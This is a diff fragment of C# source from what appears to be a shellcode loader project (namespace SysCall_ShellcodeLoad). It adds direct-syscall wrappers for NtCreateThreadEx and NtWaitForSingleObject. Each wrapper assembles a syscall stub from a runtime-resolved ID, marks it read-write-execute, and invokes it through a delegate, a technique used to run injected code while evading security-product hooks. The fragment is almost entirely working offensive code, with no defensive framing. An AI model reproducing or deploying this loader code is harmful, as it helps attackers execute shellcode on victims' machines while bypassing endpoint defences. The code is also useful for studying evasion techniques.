@@ -190,6 +190,97 @@ namespace SysCall_ShellcodeLoad
 
 		}
 
+		public static uint NtCreateThreadEx
+	  (
+		  out IntPtr hThread,
+		  uint DesiredAccess,
+		  IntPtr ObjectAttributes,
+		  IntPtr ProcessHandle,
+		  IntPtr lpStartAddress,
+		  IntPtr lpParameter,
+		  bool CreateSuspended,
+		  uint StackZeroBits,
+		  uint SizeOfStackCommit,
+		  uint SizeOfStackReserve,
+		  IntPtr lpBytesBuffer
+	  )
+		{
+			// set byte array of bNtCreateThread to new byte array called syscall
+
+			uint SyscallID = Auto_NativeCode.GetSyscallID("NtCreateThreadEx");
+			byte[] syscall1 = SYSbyte1;
+			byte[] syscallid = { (byte)SyscallID };
+			byte[] syscall2 = SYSbyte2;
+			byte[] sysfinal = syscall1.Concat(syscallid).Concat(syscall2).ToArray();
+
+			// specify unsafe context
+			unsafe
+			{
+				// create new byte pointer and set value to our syscall byte array
+				fixed (byte* ptr = sysfinal)
+				{
+					// cast the byte array pointer into a C# IntPtr called memoryAddress
+					IntPtr memoryAddress = (IntPtr)ptr;
+
+					// Change memory access to RX for our assembly code
+					if (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)sysfinal.Length, PAGE_EXECUTE_READWRITE, out uint oldprotect))
+					{
+						throw new Win32Exception();
+					}
+
+					// Get delegate for NtCreateThread
+					DelegatesStruct.NtCreateThreadEx assembledFunction = (DelegatesStruct.NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(DelegatesStruct.NtCreateThreadEx));
+
+					return (uint)assembledFunction(
+						out hThread,
+						DesiredAccess,
+						ObjectAttributes,
+						ProcessHandle,
+						lpStartAddress,
+						lpParameter,
+						CreateSuspended,
+						StackZeroBits,
+						SizeOfStackCommit,
+						SizeOfStackReserve,
+						lpBytesBuffer
+					 );
+				}
+			}
+		}
+
+		public static uint NtWaitForSingleObject(IntPtr Object, bool Alertable, uint Timeout)
+		{
+			// set byte array of bNtWaitForSingleObject to new byte array called syscall
+
+			uint SyscallID = Auto_NativeCode.GetSyscallID("NtWaitForSingleObject");
+			byte[] syscall1 = SYSbyte1;
+			byte[] syscallid = { (byte)SyscallID };
+			byte[] syscall2 = SYSbyte2;
+			byte[] sysfinal = syscall1.Concat(syscallid).Concat(syscall2).ToArray();
+
+			// specify unsafe context
+			unsafe
+			{
+				// create new byte pointer and set value to our syscall byte array
+				fixed (byte* ptr = sysfinal)
+				{
+					// cast the byte array pointer into a C# IntPtr called memoryAddress
+					IntPtr memoryAddress = (IntPtr)ptr;
+
+					// Change memory access to RX for our assembly code
+					if (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)sysfinal.Length, PAGE_EXECUTE_READWRITE, out uint oldprotect))
+					{
+						throw new Win32Exception();
+					}
+
+					// Get delegate for NtWaitForSingleObject
+					DelegatesStruct.NtWaitForSingleObject assembledFunction = (DelegatesStruct.NtWaitForSingleObject)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(DelegatesStruct.NtWaitForSingleObject));
+
+					return (uint)assembledFunction(Object, Alertable, Timeout);
+				}
+			}
+		}
+
 
 		public struct DelegatesStruct
 		{
